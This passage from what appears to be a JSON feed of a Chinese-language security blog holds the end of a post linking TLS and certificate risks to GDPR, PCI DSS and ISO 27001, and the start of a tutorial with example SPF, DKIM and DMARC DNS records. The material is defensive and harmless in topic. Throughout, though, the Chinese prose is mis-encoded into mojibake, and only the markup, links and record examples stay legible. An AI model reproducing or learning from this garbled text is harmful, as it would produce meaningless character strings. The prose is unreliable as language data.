href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ä¹‹ GDPR</strong> ï¼šæ§åˆ¶è€…æ‡‰å¯¦æ–½é©ç•¶çš„æ•¸æ“šä¿è­·æ”¿ç­–å’Œæ•¸æ“šä¿è­·åŸå‰‡ï¼Œä¾‹å¦‚å°‡å¿…è¦çš„ä¿è­·æªæ–½æ•´åˆåˆ°è³‡æ–™è™•ç†éç¨‹ä¸­ï¼Œä¹Ÿéœ€ç¢ºä¿è™•ç†æ•¸æ“šçš„ç³»çµ±å’Œæœå‹™æ©Ÿå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ï¼Œé¿å…æœªç¶“æˆæ¬Šè€Œæ­éœ²çš„å€‹äººæ•¸æ“šã€‚</h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4\">#</a> <strong>é¢¨éšªä¿®å¾©åƒè€ƒè³‡æ–™ï¼š</strong></h3>\n<p><strong>å”è­°éèˆŠï¼š</strong></p>\n<p><a href=\"https://docs.microsoft.com/zh-tw/security/engineering/disable-legacy-tls\"><strong>Windows Server 2019 ç¾å·²ä¾æ†‘è­‰ç¹«çµæä¾› TLS ç‰ˆæœ¬å¼·åˆ¶åŸ·è¡ŒåŠŸèƒ½ - Security documentation</strong></a></p>\n<p><strong>æ†‘è­‰ç›¸é—œï¼š</strong></p>\n<p>aws:</p>\n<p><a href=\"https://docs.aws.amazon.com/acm/latest/userguide/acm-overview.html\"><strong>What Is AWS Certificate Manager?</strong></a></p>\n<p>gcp(load balancer):</p>\n<p><a href=\"https://cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs\"><strong>Using Google-managed SSL certificates | Load Balancing | Google Cloud</strong></a></p>\n<p>gcp(k8s engine):</p>\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/managed-certs\"><strong>Using Google-managed SSL certificates</strong></a></p>\n<p>azure key vault:</p>\n<p><a href=\"https://docs.microsoft.com/en-us/azure/key-vault/certificates/certificate-scenarios\"><strong>Get started with Key Vault certificates</strong><br>\n</a></p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> <strong>çµè«–</strong></h2>\n<p>å°‡é¢¨éšªèˆ‡æ³•è¦æ¯”å°ä¸¦ä¸æ˜¯ç‚ºäº†èªªæ˜è‹¥æ˜¯æœªä¿®å¾©é¢¨éšªæœƒé•åå¤šå°‘æ³•è¦ï¼Œè€Œæ˜¯ç‚ºäº†è—‰è‘—é¢¨éšªçš„ä¿®å¾©ä¾†ä½è­‰è‡ªèº«å°æ–¼æ³•è¦çš„é‡è¦–ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œ ç•¶å®¢æˆ¶è©¢å•å…¬å¸æœ‰æ²’æœ‰ç¬¦åˆ GDPR çš„è¦ç¯„æ™‚ï¼Œè‹¥æ˜¯èƒ½å¤ æä¾›æ†‘è­‰çš„é¢¨éšªä¿®å¾©ç´€éŒ„ï¼Œå…¶å¯¦å°±æ˜¯ä¸€å€‹å¾ˆå¥½çš„ä½è­‰è³‡æ–™ã€‚</p>\n<p>è€Œæœ¬æ–‡æ‰€æåˆ°çš„æ”¹å–„è¤‡é›œåº¦ï¼Œå‰‡æ˜¯ç‚ºäº†ç›®å‰å¸¸è¦‹çš„è³‡æºæœ‰é™ä½†å•é¡Œä¸æœƒæ¶ˆå¤±çš„æƒ…æ³è€Œæä¾›æ±ºç­–çš„è¼”åŠ©ï¼Œç›®å‰å¸‚é¢ä¸Šæœ‰è¨±å¤šç›¸é—œçš„è©•ä¼°å ±å‘Šå’Œæƒæä¹Ÿæ˜¯åœç¹è‘—é¢¨éšªç®¡ç†çš„æ¦‚å¿µå»¶ä¼¸ï¼Œè‹¥æ˜¯èƒ½å› æ­¤è€Œç®¡ç†è‡ªèº«çš„é¢¨éšªä»¥åŠå°æ‡‰çš„æ³•è¦ä¸¦æ‰¾åˆ°æœ€é©çš„é¢¨éšªä¿®å¾©æ–¹æ¡ˆçš„è©±ï¼Œç„¡è«–æ˜¯åœ¨ç¨½æ ¸æˆ–æ˜¯å®‰å…¨æ€§çš„ç®¡æ§ä¸Šéƒ½æ˜¯ä¸€ç­†ååˆ†åˆ’ç®—çš„æŠ•è³‡ã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\">#</a> å»¶ä¼¸é–±è®€ï¼š</h2>\n<p><strong>è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆä¸€ï¼‰-å¤§æ„äº†å•Šæ²’æœ‰é–ƒï¼å¸¸è¦‹ç¶²ç«™æ›éšªä½ ä¸­äº†å¹¾é …ï¼Ÿï¼</strong></p>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/\">å¤§æ„äº†å•Šæ²’æœ‰é–ƒï¼å¸¸è¦‹ç¶²ç«™æ›éšªä½ ä¸­äº†å¹¾é …ï¼Ÿï¼</a>)</p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A\">#</a> åƒè€ƒæ–‡ç»ï¼š</h2>\n<p><strong>PCIDSS</strong></p>\n<blockquote>\n<p><a href=\"https://kirkpatrickprice.com/video/pci-requirement-6-develop-maintain-secure-systems-applications/\">https://kirkpatrickprice.com/</a></p>\n</blockquote>\n<p><strong>ISO27001</strong></p>\n<blockquote>\n<p><a href=\"https://www.isms.online/iso-27001/annex-a-10-cryptography/\">https://www.isms.online/iso-27001</a></p>\n</blockquote>\n<p><strong>GDPR</strong></p>\n<blockquote>\n<p><a href=\"https://gdpr-info.eu/art-24-gdpr/\">https://gdpr-info.eu</a></p>\n</blockquote>\n",
      "date_published": "2021-07-16T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "title": "é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šç¯„ä¾‹ç¯‡",
      "content_html": "<!-- summary -->\n<p>æœ‰é‘’æ–¼å¤§å®¶äº†è§£äº† SPFã€DKIMã€DMARC è¨­ç½®ä¸Šçš„åŸç†èˆ‡åœ°é›·å¾Œï¼Œå°æ–¼å¦‚ä½•è¨­ç½®å¯èƒ½é‚„æ˜¯éœ§é¢¯é¢¯ï¼Œå› æ­¤æ±ºå®šå†æ¨å‡ºç¯„ä¾‹ç¯‡è®“å¤§å®¶çœ‹ä¸€äº›å¯¦éš›çš„ç´€éŒ„ä»¥åŠè¨­ç½®æ–¹å¼ã€‚å¸Œæœ›å¯ä»¥è®“å¤§å®¶è¼•é¬†åšå¥½ email securityï¼</p>\n<!-- summary -->\n<p>ä»¥ä¸‹æœ‰ä¸æ‡‚çš„æ¨™ç±¤å¯ä»¥åƒç…§è¨­å®šç¯‡ï¼š<br>\nSPF çš„è¨­å®š ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ SPF</a><br>\nDKIMã€DMARC çš„è¨­å®š ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ DKIMã€DMARC</a></p>\n<p>ä»¥ä¸‹ä¸»è¦ä»¥ <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> ä½œç‚ºç´€éŒ„æŸ¥è©¢å·¥å…·ã€‚</p>\n<hr>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>åœ¨è¨­å®š SPF æ™‚æœ€é‡è¦çš„å°±æ˜¯çŸ¥é“ã€æœ‰å“ªäº›å¯„ä¿¡çš„ç¶²åŸŸã€ã€‚æˆ‘å€‘ç”¨å¹¾ç¨®æƒ…å¢ƒèˆ‰ä¾‹ï¼š</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\">#</a> æƒ…å¢ƒä¸€ï¼šåªæœ‰è‡ªå®¶ç¶²åŸŸ</h3>\n<p>é¦–å…ˆï¼Œä½ éœ€è¦çŸ¥é“è‡ªå·±æœ‰å“ªäº› mail server ã€‚</p>\n<p>é€™æ™‚ä½ æœ‰ä¸‹é¢å¹¾ç¨®é¸é …ï¼š</p>\n<p><strong>mail server èˆ‡å¯„ä¿¡ domain ç›¸åŒ(IP åŒ)</strong>ï¼Œå…è¨± IP å°±æ˜¯æ­¤ domain çš„ IPï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 a -all</code></pre>\n<p><strong>mail server èˆ‡å¯„ä¿¡ domain ç›¸åŒ(IP ä¸åŒ)</strong>ï¼Œå…è¨± IP å°±æ˜¯ mail server çš„ IPï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx -all</code></pre>\n<p><strong>mail server èˆ‡å¯„ä¿¡ domain ä¸åŒï¼Œæˆ–æ˜¯æœ‰å¤šå° mail server</strong>ï¼Œéœ€ä¸€ä¸€åˆ—å‡ºï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx:mail-server-1 mx:mail-server-2 mx:mail-server-3 -all</code></pre>\n<p><strong>å·²ç¶“æœ‰åˆ¥çš„å¯„ä¿¡ domain è¨­ç½®å¥½ SPF</strong> ï¼Œä¾‹å¦‚ google è‡ªå·±æ˜¯ email provider åˆåŒæ™‚æä¾› email hostingï¼Œä»¥ä¸‹ç‚º <a href=\"http://gmail.com\">gmail.com</a> çš„ SPF ç´€éŒ„ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 redirect=_spf.google.com</code></pre>\n<p>å»ºè­°å¦‚æœæƒ³çœä¸‹ DNS query çš„æ‰£æ‰“ï¼Œå¯ä»¥è€ƒæ…® <strong>å±•é–‹æˆ <code>ip4</code> <code>ip6</code> æ©Ÿåˆ¶</strong>ï¼Œä¾‹å¦‚ä»¥ä¸‹ç‚º MailChimpï¼ˆ<a href=\"http://servers.mcsv.net\">servers.mcsv.net</a>ï¼‰çš„ SPF ç´€éŒ„ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 ip4:205.201.128.0/20 ip4:198.2.128.0/18 ip4:148.105.8.0/21 -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> æƒ…å¢ƒäºŒï¼šä½¿ç”¨é›²ç«¯æˆ–æ˜¯ç¬¬ä¸‰æ–¹ç¶²åŸŸ</h3>\n<p>ç•¶ä½ ä½¿ç”¨ç¬¬ä¸‰æ–¹ç¶²åŸŸå¯„ä¿¡ï¼Œå°±å¿…é ˆæŠŠä»–å€‘çš„ mail server ä¹Ÿæ”¾åˆ°è‡ªå·±çš„ SPF ç´€éŒ„ä¸­ï¼Œä¸€èˆ¬è€Œè¨€ä»–å€‘éƒ½å·²ç¶“æœ‰è¨­å¥½ SPF ç´€éŒ„äº†ï¼Œæ‰€ä»¥ä½ åªè¦ç”¨ <code>include</code> æ©Ÿåˆ¶å°±å¯ä»¥æ¶µè“‹ã€‚è«‹å»æŸ¥è©¢ä»–å€‘è¨­ç½® SPF çš„ domain ç„¶å¾ŒåŠ åˆ°ç´€éŒ„ä¸­ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:third-1 include:third-2 include:third-3 -all</code></pre>\n<p><em>***æ–‡æœ«é™„ä¸Šæœ€è¿‘æ•´ç†çš„å¸¸è¦‹ç¬¬ä¸‰æ–¹ SPF domain***</em></p>\n<p>ä»¥ OneDegree ç‚ºä¾‹ï¼Œæˆ‘å€‘ä½¿ç”¨çš„ hosting provider ç‚º Microsoft Office365ï¼Œç¬¬ä¸‰æ–¹æœå‹™ç‚ºï¼š SendGridã€MailChimpã€FreshDeskã€‚å»ç¶²ç«™ä¸ŠæŸ¥ä¸€ä¸‹æˆ–æ˜¯åœ¨æœå‹™çš„ portal è£¡æ‡‰è©²å°±èƒ½è¼•é¬†æ‰¾åˆ°è¨­ç½® SPF çš„ domainï¼Œä¾‹å¦‚ä¸‹åœ–æ˜¯ MailChimp çš„æ–‡ä»¶ï¼š</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mailchimp.png\" alt=\"\"></p>\n<p>è³‡æ–™æ”¶é›†å®Œæˆï¼Œå°±èƒ½åˆæ­¥å»ºæ§‹å‡ºæˆ‘å€‘çš„ SPF ç´€éŒ„ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:sendgrid.net include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<p>å†ä¾†å°±æ˜¯å„ªåŒ–çš„éƒ¨åˆ†ï¼Œä½ å¯ä»¥å» <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> é€ä¸€æŸ¥è©¢ä»¥ä¸Š include çš„é€™äº›ç´€éŒ„ï¼Œæœƒç™¼ç¾ <a href=\"http://email.freshdesk.com\">email.freshdesk.com</a> å·²ç¶“åŒ…å«äº† <a href=\"http://sendgrid.net\">sendgrid.net</a> ï¼Œä¹Ÿå°±æ˜¯èªªå…¶å¯¦æˆ‘å€‘è‡ªå·±çš„ç´€éŒ„ä¸­å·²ç¶“é‡è¤‡ include äº†ï¼Œé€ æˆä¸€æ¬¡å¤šé¤˜çš„ DNS queryã€‚</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mxtoolbox.png\" alt=\"\"></p>\n<p>æ’é™¤é‡è¤‡çš„éƒ¨åˆ†ï¼Œæˆ‘å€‘å°±èƒ½å¾—åˆ°æœ€çµ‚çš„ SPF ç´€éŒ„ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> æƒ…å¢ƒä¸‰ï¼šåŒæ™‚ä½¿ç”¨è‡ªå®¶ç¶²åŸŸè·Ÿç¬¬ä¸‰æ–¹ç¶²åŸŸ</h3>\n<p>é€™æ‡‰è©²æ˜¯æœ€å¸¸è¦‹çš„æƒ…æ³äº†ã€‚åªè¦çµåˆä¸Šé¢çš„å…©å€‹æƒ…å¢ƒå°±è¡Œï¼Œä¸€èˆ¬ä¾†èªªæœƒæŠŠè‡ªå®¶çš„ <code>a</code> <code>mx</code> æ”¾å‰é¢ï¼Œ<code>include</code> çš„æ”¾å¾Œé¢ï¼Œä¸éé€™ä¹Ÿæ²’æœ‰è¦å®šï¼Œç´”ç²¹é–±è®€æ–¹ä¾¿å°±æ˜¯äº†ã€‚</p>\n<p>è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ æœ‰ç”¨åˆ° <code>redirect</code> è¨˜å¾—è¦æ”¾æœ€å¾Œï¼Œå› ç‚º <code>redirect</code> æ˜¯ä¸€ç¨® modifierï¼Œä¹Ÿå°±æ˜¯å‰é¢çš„ mechanism éƒ½æ²’æœ‰ match æ‰æœƒåŸ·è¡Œï¼Œç›¸å°çš„ï¼Œè·³åˆ° <code>redirect</code> çš„ SPF ç´€éŒ„ä¹‹å¾Œï¼Œå°±æœƒä»¥é‚£ç­† SPF ç´€éŒ„ç‚ºä¸»ï¼Œæœ¬ä¾†åœ¨ <code>redirect</code> å¾Œé¢çš„æ±è¥¿éƒ½æœƒè¢«å¿½ç•¥ã€‚æ‰€ä»¥å¦‚æœè¦ç”¨å°±è¦é•·é€™æ¨£ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx include:spf.protection.outlook.com include:sendgrid.net redirect:_spf.PROVIDERSERVER.COM</code></pre>\n<h3 id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\">#</a> ç™¼å¸ƒç´€éŒ„</h3>\n<p>å»ºæ§‹å¥½ SPF ç´€éŒ„å¾Œè«‹åœ¨ä½ çš„ DNS è£¡ä»¥ TXT é¡å‹ç™¼å¸ƒå‡ºå»ï¼Œç­‰å¾…å¹¾åˆ†é˜æ‡‰è©²å°±å¯ä»¥åœ¨ mxtoolbox ä¸ŠæŸ¥è©¢åˆ°äº†ã€‚ä½¿ç”¨é›²ç«¯ hosting provideræœå‹™è«‹ä¸€æ¨£åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼š<a href=\"https://support.google.com/a/answer/10684623?hl=en&amp;ref_topic=10685331\">Gsuite</a>ã€<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/set-up-spf-in-office-365-to-help-prevent-spoofing?view=o365-worldwide#create-or-update-your-spf-txt-record\">Office365</a>ã€<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-spf.html\">Amazon SES</a>ã€‚</p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>DKIM ä¸åŒæ–¼ SPF åœ¨æ–¼ï¼Œä¸€ç­† SPF ç´€éŒ„å°±ä»£è¡¨äº†ä¸€å€‹å¯„ä¿¡ domainï¼Œå› æ­¤ä½ æœ‰å¹¾å€‹æœƒå¯„ä¿¡çš„ domain å°±è¦æœ‰å¹¾ç­† SPF ç´€éŒ„ï¼Œä½†æ˜¯ DKIM æ˜¯ä¸€å€‹ domain å¯ä»¥æœ‰å¾ˆå¤šç­†çš„ï¼Œåªè¦å„å€‹ mail server ä½¿ç”¨çš„ selector éƒ½ä¸åŒå°±å¥½ã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\">#</a> æƒ…å¢ƒä¸€ï¼šè‡ªæ¶çš„ emailÂ server</h3>\n<p>å¯ä»¥ç”¨é€™å€‹ <a href=\"https://dmarcly.com/tools/dkim-record-generator\">DKIM generator</a> ä¾†ç”¢ç”Ÿå…¬ç§é‘°ï¼Œè«‹æŠŠç§é‘°æ”¾å…¥ mail server è¨­å®šä¸­ä¿ç®¡å¥½ï¼Œç„¶å¾ŒæŠŠå…¬é‘°å¾ DNS ç™¼å¸ƒå‡ºå»ã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\">#</a> æƒ…å¢ƒäºŒï¼šé›²ç«¯ hostingÂ provider</h3>\n<p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯é›²ç«¯ hosting provider çš„æœå‹™ï¼Œä¾‹å¦‚ç”¨ Microsoft Office365 æˆ–æ˜¯ Gsuiteï¼Œé‚£éº¼ DKIM çš„è¨­å®šå·²ç¶“å…§å»ºäº†å¹¾ä¹ä¸ç”¨ä½ åšã€‚å¦‚æœä½ æƒ³ç”¨è‡ªå·±çš„key pair ä¹Ÿå¯ä»¥ï¼Œè·Ÿè‘—æ•™å­¸è¨­å®šï¼š<a href=\"https://support.google.com/a/answer/174126\">Gsuite</a>ã€<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dkim-to-validate-outbound-email?view=o365-worldwide\">Office365</a>ã€<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-dkim-easy-setup-domain.html\">Amazon SES</a> å°±å¯ä»¥äº†ï¼Œä»–é‚„æœƒå¹«ä½ ç™¼å¸ƒåˆ° DNSã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> æƒ…å¢ƒä¸‰ï¼šç¬¬ä¸‰æ–¹æœå‹™</h3>\n<p>å¦‚æœæ˜¯å…¶ä»–ç¬¬ä¸‰æ–¹æœå‹™ï¼ˆmarketing email ç­‰ç­‰ï¼‰ï¼Œåšæ³•å¾€å¾€æ˜¯è«‹ä½ ç™¼ä¸€ç­† CNAME ç´€éŒ„æŒ‡åˆ°ç”±ç¬¬ä¸‰æ–¹æœå‹™å¯¦éš›å‰µé€ ä¸¦ç™¼å¸ƒçš„å…¬é‘°ï¼Œé€™æ¨£å°±å¯ä»¥ç”±ç¬¬ä¸‰æ–¹æœå‹™çµ±ä¸€ç®¡ç†å…¬ç§é‘°ï¼Œä½ ä¹Ÿä¸ç”¨æ“”å¿ƒ DKIM æ²’ç™¼å¥½ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæ˜¯ç”¨ SendGridï¼Œå®Œæˆ â€œSettings/Sender Authentication/Authenticate Your Domainâ€ çš„æµç¨‹å¾Œæœƒä¾†åˆ°é€™ä¸€é ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-examples/dmarcly.png\" /><figcaption><p>from <a href=\"https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-sendgrid\">DMARCLY tutorial</a></p>\n</figcaption></figure></p>\n<p>ä½ å°±ç…§è‘—ç™¼åœ¨ DNS å°±å¥½ï¼Œå¦‚ä¸‹ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">//æˆ‘å€‘ç™¼å¸ƒçš„<br>s1._domainkey.example.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net<br><br>//sendgrid ç™¼å¸ƒçš„<br>s1.domainkey.uXXX.wlXXX.sendgrid.net TXT \"v=DKIM1; k=rsa;....\"</code></pre>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>ä»¥ä¸‹çš†å»ºè­°æ¡æœ€åš´æ ¼çš„è¨­ç½®ï¼Œè‹¥æ“”å¿ƒä½¿ç”¨ <code>p=reject</code> æœƒå¤ªéåš´è‹›é€ æˆå›°æ“¾è«‹è‡³å°‘ä½¿ç”¨ <code>p=quarantine</code>ã€‚</p>\n<p>ä»¥ä¸‹ç¯„ä¾‹è«‹æŠŠ <code>rua</code> è·Ÿ <code>ruf</code> ä¸­çš„ <code>xx</code> æ›æˆè‡ªå·±çš„ä¿¡ç®±ã€‚å¯ä»¥åœ¨å¯„ä¿¡ç¶²åŸŸä¸­è¨­å®šä¸€å€‹å°ˆé–€æ¥æ”¶å ±å‘Šçš„ä¿¡ç®±ï¼ˆä¾‹å¦‚ OneDegree å°±å‰µç«‹äº†ä¸€å€‹ <code>dmarc.reporting@onedegree.hk</code>ï¼‰ï¼Œæˆ–æ˜¯å¦‚æœæœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ DMARC reporting åŠŸèƒ½ï¼ˆä¾‹å¦‚ <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>ï¼‰å°±æ›æˆä»–å€‘æä¾›çš„ä¿¡ç®±ã€‚</p>\n<p>å¦‚æœæ±ºå®šæŠŠå ±å‘Šå¯„åˆ°å…¶ä»–ç¶²åŸŸçš„è©±ï¼Œå‹™å¿…æ³¨æ„æ”¶ä¿¡äººç¶²åŸŸæœ‰æ²’æœ‰æˆæ¬Šæ¥æ”¶å ±å‘Šã€‚æ ¹æ“š RFC è¦ç¯„ï¼Œæ”¶ä¿¡äººç¶²åŸŸéœ€è¦åœ¨ <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> ç™¼ä¸€ç­† DMARC ç´€éŒ„ä¾†æˆæ¬Šå ±å‘Šå¯„é€ã€‚å‡è¨­ DMARC ç´€éŒ„ç¶²åŸŸï¼š<a href=\"http://sender.com\">sender.com</a>ï¼Œæ”¶å ±å‘Šåœ°å€ç‚ºï¼šreport@thirdparty.comï¼Œå‰‡ <a href=\"http://thirdparty.com\">thirdparty.com</a> è¦åœ¨ <code>sender.com._report._dmarc.thirdparty.com</code> ç™¼ä¸€ç­†å…§å®¹ç‚º <code>v=DMARC1</code> çš„ TXT ç´€éŒ„ã€‚é€™å€‹æ©Ÿåˆ¶çš„ç›®çš„ä¸€ä¾†æ˜¯ç‚ºäº†é˜²æ­¢æœ‰äººæ•…æ„ç”¨å¤§é‡å ±å‘Šå°ç¬¬ä¸‰æ–¹çš„æ”¶ä¿¡äººåšåƒåœ¾ä¿¡ä»¶æ”»æ“Šï¼ˆspammingï¼‰ï¼ŒäºŒä¾†ä¹Ÿæ˜¯ä¿è­·ç™¼è¡Œ DMARC ç´€éŒ„çš„ç¶²åŸŸä¸è¦è®“éå¤šè³‡è¨Šå¤–æµã€‚</p>\n<p>è±†çŸ¥è­˜ï¼šå‰é¢æåˆ°çš„ <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>ï¼Œå°±æ˜¯è¨­å®šæ¥æ”¶æ‰€æœ‰å ±å‘Šå“¦ï¼<code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code></p>\n<p>å¦å¤–ï¼Œå¦‚æœä½ æ˜¯ç¬¬ä¸€æ¬¡è¨­å®šï¼Œå»ºè­° <code>p=reject</code> å…ˆæ”¹æˆ <code>p=none</code> é˜²æ­¢ä¿¡ä»¶çªç„¶éƒ½è¢«æ“‹æ‰ã€‚è«‹ç¢ºèªæ¯æ—¥çš„å½™æ•´å ±å‘Šçµæœç¬¦åˆé æœŸï¼Œä¸¦æ­é…æ‰‹å‹•æª¢æŸ¥åŸå§‹ä¿¡ä»¶çœ‹çœ‹ä¸åŒæ”¶ä¿¡ mail server 